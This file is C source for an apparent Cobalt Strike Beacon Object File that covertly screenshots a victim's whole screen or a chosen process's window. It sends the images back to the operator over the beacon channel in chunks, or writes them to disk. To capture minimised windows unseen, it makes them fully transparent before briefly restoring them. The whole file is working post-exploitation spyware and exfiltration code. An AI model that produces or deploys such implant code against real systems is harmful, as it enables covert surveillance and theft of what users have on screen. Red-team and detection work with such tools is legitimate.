#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include "bofdefs.h"

#pragma comment(lib, "User32.lib")
#pragma comment(lib, "Gdi32.lib")

/*-------------------------------------------------------------
  downloadFile:
  Packages the given file data (returnData, of size fileSize)
  along with the provided fileName and sends it via BeaconOutput.
  No globals are used.
-------------------------------------------------------------*/
void downloadFile(char* fileName, int downloadFileNameLength, char* returnData, int fileSize)
{
    time_t t;
    MSVCRT$srand((unsigned)MSVCRT$time(&t));
    int fileId = MSVCRT$rand();

    int messageLength = downloadFileNameLength + 8;
    char* packedData = (char*)MSVCRT$malloc(messageLength);

    /* Pack fileId (4 bytes) */
    packedData[0] = (fileId >> 24) & 0xFF;
    packedData[1] = (fileId >> 16) & 0xFF;
    packedData[2] = (fileId >> 8) & 0xFF;
    packedData[3] = fileId & 0xFF;

    /* Pack fileSize (4 bytes) */
    packedData[4] = (fileSize >> 24) & 0xFF;
    packedData[5] = (fileSize >> 16) & 0xFF;
    packedData[6] = (fileSize >> 8) & 0xFF;
    packedData[7] = fileSize & 0xFF;

    int packedIndex = 8;
    for (int i = 0; i < downloadFileNameLength; i++) {
        packedData[packedIndex++] = fileName[i];
    }
    BeaconOutput(CALLBACK_FILE, packedData, messageLength);

    int chunkSize = 1024 * 900;
    if (fileSize > chunkSize) {
        int index = 0;
        while (index < fileSize) {
            if (fileSize - index > chunkSize) {
                int chunkLength = 4 + chunkSize;
                char* packedChunk = (char*)MSVCRT$malloc(chunkLength);
                packedChunk[0] = (fileId >> 24) & 0xFF;
                packedChunk[1] = (fileId >> 16) & 0xFF;
                packedChunk[2] = (fileId >> 8) & 0xFF;
                packedChunk[3] = fileId & 0xFF;
                int chunkIndex = 4;
                for (int i = index; i < index + chunkSize; i++) {
                    packedChunk[chunkIndex++] = returnData[i];
                }
                BeaconOutput(CALLBACK_FILE_WRITE, packedChunk, chunkLength);
            }
            else {
                int lastChunkLength = fileSize - index + 4;
                char* lastChunk = (char*)MSVCRT$malloc(lastChunkLength);
                lastChunk[0] = (fileId >> 24) & 0xFF;
                lastChunk[1] = (fileId >> 16) & 0xFF;
                lastChunk[2] = (fileId >> 8) & 0xFF;
                lastChunk[3] = fileId & 0xFF;
                int lastChunkIndex = 4;
                for (int i = index; i < fileSize; i++) {
                    lastChunk[lastChunkIndex++] = returnData[i];
                }
                BeaconOutput(CALLBACK_FILE_WRITE, lastChunk, lastChunkLength);
            }
            index += chunkSize;
        }
    }
    else {
        int chunkLength = 4 + fileSize;
        char* packedChunk = (char*)MSVCRT$malloc(chunkLength);
        packedChunk[0] = (fileId >> 24) & 0xFF;
        packedChunk[1] = (fileId >> 16) & 0xFF;
        packedChunk[2] = (fileId >> 8) & 0xFF;
        packedChunk[3] = fileId & 0xFF;
        int chunkIndex = 4;
        for (int i = 0; i < fileSize; i++) {
            packedChunk[chunkIndex++] = returnData[i];
        }
        BeaconOutput(CALLBACK_FILE_WRITE, packedChunk, chunkLength);
    }

    char packedClose[4];
    packedClose[0] = (fileId >> 24) & 0xFF;
    packedClose[1] = (fileId >> 16) & 0xFF;
    packedClose[2] = (fileId >> 8) & 0xFF;
    packedClose[3] = fileId & 0xFF;
    BeaconOutput(CALLBACK_FILE_CLOSE, packedClose, 4);
}

/*-------------------------------------------------------------
  SaveHBITMAPToFile:
  Saves (or downloads) the given HBITMAP as a BMP file with
  the provided file name. All variables are local.
-------------------------------------------------------------*/
BOOL SaveHBITMAPToFile(HBITMAP hBitmap, LPCTSTR lpszFileName, int savemethod)
{
    HDC hDC;
    int iBits;
    WORD wBitCount;
    DWORD dwPaletteSize = 0, dwBmBitsSize = 0, dwDIBSize = 0, dwWritten = 0;
    BITMAP Bitmap0;
    BITMAPFILEHEADER bmfHdr;
    BITMAPINFOHEADER bi;
    LPBITMAPINFOHEADER lpbi;
    HANDLE fh, hDib, hPal;
    HGDIOBJ hOldPal2 = NULL;

    hDC = CreateDC(TEXT("DISPLAY"), NULL, NULL, NULL);
    iBits = GetDeviceCaps(hDC, BITSPIXEL) * GetDeviceCaps(hDC, PLANES);
    DeleteDC(hDC);
    if (iBits <= 1)
        wBitCount = 1;
    else if (iBits <= 4)
        wBitCount = 4;
    else if (iBits <= 8)
        wBitCount = 8;
    else
        wBitCount = 24;

    GetObject(hBitmap, sizeof(Bitmap0), (LPSTR)&Bitmap0);
    bi.biSize = sizeof(BITMAPINFOHEADER);
    bi.biWidth = Bitmap0.bmWidth;
    /* Negative height makes the bitmap top�down */
    bi.biHeight = -Bitmap0.bmHeight;
    bi.biPlanes = 1;
    bi.biBitCount = wBitCount;
    bi.biCompression = BI_RGB;
    bi.biSizeImage = 0;
    bi.biXPelsPerMeter = 0;
    bi.biYPelsPerMeter = 0;
    bi.biClrImportant = 0;
    bi.biClrUsed = 256;

    dwBmBitsSize = ((Bitmap0.bmWidth * wBitCount + 31) & ~31) / 8 * Bitmap0.bmHeight;
    hDib = GlobalAlloc(GHND, dwBmBitsSize + dwPaletteSize + sizeof(BITMAPINFOHEADER));
    lpbi = (LPBITMAPINFOHEADER)GlobalLock(hDib);
    *lpbi = bi;

    hPal = GetStockObject(DEFAULT_PALETTE);
    if (hPal) {
        hDC = GetDC(NULL);
        hOldPal2 = SelectPalette(hDC, (HPALETTE)hPal, FALSE);
        RealizePalette(hDC);
    }

    GetDIBits(hDC, hBitmap, 0, (UINT)Bitmap0.bmHeight,
        (LPSTR)lpbi + sizeof(BITMAPINFOHEADER) + dwPaletteSize,
        (BITMAPINFO*)lpbi, DIB_RGB_COLORS);

    if (hOldPal2) {
        SelectPalette(hDC, (HPALETTE)hOldPal2, TRUE);
        RealizePalette(hDC);
        ReleaseDC(NULL, hDC);
    }

    bmfHdr.bfType = 0x4D42;  /* 'BM' */
    dwDIBSize = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER) + dwPaletteSize + dwBmBitsSize;
    bmfHdr.bfSize = dwDIBSize;
    bmfHdr.bfReserved1 = 0;
    bmfHdr.bfReserved2 = 0;
    bmfHdr.bfOffBits = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER) + dwPaletteSize;
    void* bmpdata = malloc(sizeof(BITMAPFILEHEADER) + dwDIBSize);
    memcpy(bmpdata, &bmfHdr, sizeof(BITMAPFILEHEADER));
    memcpy(((char*)bmpdata) + sizeof(BITMAPFILEHEADER), lpbi, dwDIBSize);

    if (savemethod == 0) {
        BeaconPrintf(CALLBACK_OUTPUT, "[DEBUG] Saving bitmap to disk with filename %s", lpszFileName);
        fh = CreateFileA(lpszFileName, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS,
            FILE_ATTRIBUTE_NORMAL | FILE_FLAG_SEQUENTIAL_SCAN, NULL);
        if (fh == INVALID_HANDLE_VALUE)
            return FALSE;
        WriteFile(fh, (LPSTR)bmpdata, sizeof(BITMAPFILEHEADER) + dwDIBSize, &dwWritten, NULL);
        CloseHandle(fh);
    }
    else {
        BeaconPrintf(CALLBACK_OUTPUT, "[DEBUG] Downloading bitmap over beacon with filename %s", lpszFileName);
        downloadFile((char*)lpszFileName, (int)strlen(lpszFileName),
            (char*)bmpdata, (int)(sizeof(BITMAPFILEHEADER) + dwDIBSize));
    }

    GlobalUnlock(hDib);
    GlobalFree(hDib);
    free(bmpdata);
    return TRUE;
}

/*-------------------------------------------------------------
  EnumWindowsProc:
  Callback for EnumWindows. Instead of a struct, we use a local
  two�element LONG_PTR array to pass the PID and capture the
  matching window handle.
-------------------------------------------------------------*/
BOOL CALLBACK EnumWindowsProc(HWND hwnd, LPARAM lParam)
{
    /* lParam points to a two�element array:
       index 0: the target PID (stored as LONG_PTR)
       index 1: the found window handle (initially 0)
    */
    LONG_PTR* params = (LONG_PTR*)lParam;
    DWORD targetPid = (DWORD)params[0];
    DWORD windowPid = 0;
    GetWindowThreadProcessId(hwnd, &windowPid);
    if (windowPid == targetPid && IsWindowVisible(hwnd)) {
        params[1] = (LONG_PTR)hwnd;
        return FALSE;
    }
    return TRUE;
}

/*-------------------------------------------------------------
  FindWindowByPID:
  Given a PID and debug flag, uses EnumWindows and a local
  two�element array (instead of a struct) to find a matching
  window handle.
-------------------------------------------------------------*/
HWND FindWindowByPID(DWORD pid, int debug)
{
    LONG_PTR params[2];
    params[0] = (LONG_PTR)pid;
    params[1] = 0;
    if (debug)
        BeaconPrintf(CALLBACK_OUTPUT, "[DEBUG] Enumerating windows for PID %d", pid);
    EnumWindows(EnumWindowsProc, (LPARAM)&params);
    if (debug) {
        if ((HWND)params[1])
            BeaconPrintf(CALLBACK_OUTPUT, "[DEBUG] Found window handle: 0x%p", (HWND)params[1]);
        else
            BeaconPrintf(CALLBACK_OUTPUT, "[DEBUG] No window found for PID %d", pid);
    }
    return (HWND)params[1];
}

/*-------------------------------------------------------------
  CaptureWindow:
  Captures the given window (by hwnd) into an HBITMAP.
  If the window is minimized, it is temporarily restored.
  Debug messages are printed only when debug is 1.
-------------------------------------------------------------*/
HBITMAP CaptureWindow(HWND hwnd, int debug)
{
    if (debug)
        BeaconPrintf(CALLBACK_OUTPUT, "[DEBUG] Starting CaptureWindow for hwnd 0x%p", hwnd);

    WINDOWPLACEMENT wp = { 0 };
    wp.length = sizeof(WINDOWPLACEMENT);
    if (!GetWindowPlacement(hwnd, &wp)) {
        BeaconPrintf(CALLBACK_ERROR, "[DEBUG] GetWindowPlacement failed");
        return NULL;
    }
    if (debug)
        BeaconPrintf(CALLBACK_OUTPUT, "[DEBUG] Window showCmd: %d", wp.showCmd);

    RECT captureRect;
    int width, height;
    BOOL success = FALSE;
    HDC hdcScreen = GetDC(NULL);
    HDC hdcMem = CreateCompatibleDC(hdcScreen);
    HBITMAP hBitmap = NULL;

    if (wp.showCmd == SW_SHOWMINIMIZED) {
        if (debug)
            BeaconPrintf(CALLBACK_OUTPUT, "[DEBUG] Window is minimized; restoring temporarily for capture");

        LONG exStyle = GetWindowLong(hwnd, GWL_EXSTYLE);
        SetWindowLong(hwnd, GWL_EXSTYLE, exStyle | WS_EX_LAYERED | WS_EX_TOOLWINDOW);
        SetLayeredWindowAttributes(hwnd, 0, 0, LWA_ALPHA);
        ShowWindow(hwnd, SW_RESTORE);
        UpdateWindow(hwnd);
        Sleep(500);  /* Allow time for rendering */

        if (!GetWindowRect(hwnd, &captureRect)) {
            BeaconPrintf(CALLBACK_ERROR, "[DEBUG] GetWindowRect failed (restored window)");
            goto cleanup;
        }
        width = captureRect.right - captureRect.left;
        height = captureRect.bottom - captureRect.top;
        if (debug)
            BeaconPrintf(CALLBACK_OUTPUT, "[DEBUG] Restored window dimensions: %d x %d", width, height);
        if (width <= 0 || height <= 0) {
            BeaconPrintf(CALLBACK_ERROR, "[DEBUG] Invalid window dimensions");
            goto cleanup;
        }
        hBitmap = CreateCompatibleBitmap(hdcScreen, width, height);
        if (!hBitmap) {
            BeaconPrintf(CALLBACK_ERROR, "[DEBUG] Failed to create compatible bitmap");
            goto cleanup;
        }
        SelectObject(hdcMem, hBitmap);
        success = PrintWindow(hwnd, hdcMem, PW_RENDERFULLCONTENT);
        if (!success) {
            if (debug)
                BeaconPrintf(CALLBACK_OUTPUT, "[DEBUG] PrintWindow failed; falling back to BitBlt");
            success = BitBlt(hdcMem, 0, 0, width, height,
                hdcScreen, captureRect.left, captureRect.top, SRCCOPY);
            if (!success)
                BeaconPrintf(CALLBACK_ERROR, "[DEBUG] Both PrintWindow and BitBlt failed");
        }
        /* Restore window state */
        ShowWindow(hwnd, SW_MINIMIZE);
        SetWindowLong(hwnd, GWL_EXSTYLE, exStyle);
        SetWindowPos(hwnd, NULL, 0, 0, 0, 0,
            SWP_NOMOVE | SWP_NOSIZE | SWP_NOZORDER | SWP_FRAMECHANGED);
    }
    else {
        if (!GetWindowRect(hwnd, &captureRect)) {
            BeaconPrintf(CALLBACK_ERROR, "[DEBUG] GetWindowRect failed");
            goto cleanup;
        }
        width = captureRect.right - captureRect.left;
        height = captureRect.bottom - captureRect.top;
        if (debug)
            BeaconPrintf(CALLBACK_OUTPUT, "[DEBUG] Window dimensions: %d x %d", width, height);
        if (width <= 0 || height <= 0) {
            BeaconPrintf(CALLBACK_ERROR, "[DEBUG] Invalid window dimensions");
            goto cleanup;
        }
        hBitmap = CreateCompatibleBitmap(hdcScreen, width, height);
        if (!hBitmap) {
            BeaconPrintf(CALLBACK_ERROR, "[DEBUG] Failed to create compatible bitmap");
            goto cleanup;
        }
        SelectObject(hdcMem, hBitmap);
        success = BitBlt(hdcMem, 0, 0, width, height,
            hdcScreen, captureRect.left, captureRect.top, SRCCOPY);
        if (!success)
            BeaconPrintf(CALLBACK_ERROR, "[DEBUG] BitBlt failed");
    }

cleanup:
    if (hdcMem)
        DeleteDC(hdcMem);
    if (hdcScreen)
        ReleaseDC(NULL, hdcScreen);
    if (!success) {
        if (hBitmap)
            DeleteObject(hBitmap);
        if (debug)
            BeaconPrintf(CALLBACK_OUTPUT, "[DEBUG] CaptureWindow failed");
        return NULL;
    }
    if (debug)
        BeaconPrintf(CALLBACK_OUTPUT, "[DEBUG] CaptureWindow succeeded");
    return hBitmap;
}

/*-------------------------------------------------------------
   BOF Arguments:
    1. Filename (string)
    2. Save method: 0 = save to disk, 1 = download via Beacon.
    3. PID: if nonzero, capture that window; if zero, capture the full screen.
-------------------------------------------------------------*/
#ifdef BOF
void go(char* buff, int len)
{
    datap parser;
    BeaconDataParse(&parser, buff, len);

    char* filename = BeaconDataExtract(&parser, NULL);
    int savemethod = BeaconDataInt(&parser);
    int pid = BeaconDataInt(&parser);
    int debug = 0;

    if (debug)
        BeaconPrintf(CALLBACK_OUTPUT,
            "[DEBUG] go() called with filename: %s, savemethod: %d, pid: %d, debug: %d",
            filename, savemethod, pid, debug);

    HBITMAP hBitmap = NULL;
    if (pid != 0) {
        if (debug)
            BeaconPrintf(CALLBACK_OUTPUT, "[DEBUG] Attempting to capture window for PID %d", pid);
        HWND hwnd = FindWindowByPID((DWORD)pid, debug);
        if (hwnd == NULL) {
            BeaconPrintf(CALLBACK_ERROR, "[DEBUG] Window with PID %d not found", pid);
            return;
        }
        hBitmap = CaptureWindow(hwnd, debug);
        if (hBitmap == NULL) {
            BeaconPrintf(CALLBACK_ERROR, "[DEBUG] Failed to capture window with PID %d", pid);
            return;
        }
    }
    else {
        if (debug)
            BeaconPrintf(CALLBACK_OUTPUT, "[DEBUG] Capturing full screen");
        int x1 = GetSystemMetrics(SM_XVIRTUALSCREEN);
        int y1 = GetSystemMetrics(SM_YVIRTUALSCREEN);
        int w = GetSystemMetrics(SM_CXVIRTUALSCREEN);
        int h = GetSystemMetrics(SM_CYVIRTUALSCREEN);
        HDC hScreen = GetDC(NULL);
        HDC hDC = CreateCompatibleDC(hScreen);
        hBitmap = CreateCompatibleBitmap(hScreen, w, h);
        if (!hBitmap) {
            BeaconPrintf(CALLBACK_ERROR, "[DEBUG] Failed to create full screen bitmap");
            ReleaseDC(NULL, hScreen);
            DeleteDC(hDC);
            return;
        }
        HGDIOBJ old_obj = SelectObject(hDC, hBitmap);
        if (!BitBlt(hDC, 0, 0, w, h, hScreen, x1, y1, SRCCOPY))
            BeaconPrintf(CALLBACK_ERROR, "[DEBUG] BitBlt failed for full screen capture");
        SelectObject(hDC, old_obj);
        DeleteDC(hDC);
        ReleaseDC(NULL, hScreen);
    }

    if (hBitmap) {
        if (debug)
            BeaconPrintf(CALLBACK_OUTPUT, "[DEBUG] Captured bitmap successfully; saving/downloading as %s", filename);
        if (!SaveHBITMAPToFile(hBitmap, filename, savemethod))
            BeaconPrintf(CALLBACK_ERROR, "[DEBUG] Failed to save bitmap");
        else
            BeaconPrintf(CALLBACK_OUTPUT, "[DEBUG] Screenshot saved/downloaded as %s", filename);
        DeleteObject(hBitmap);
    }
}
#else
void main(int argc, char* argv[])
{
    /* Non-BOF main() implementation (if needed) */
}
#endif
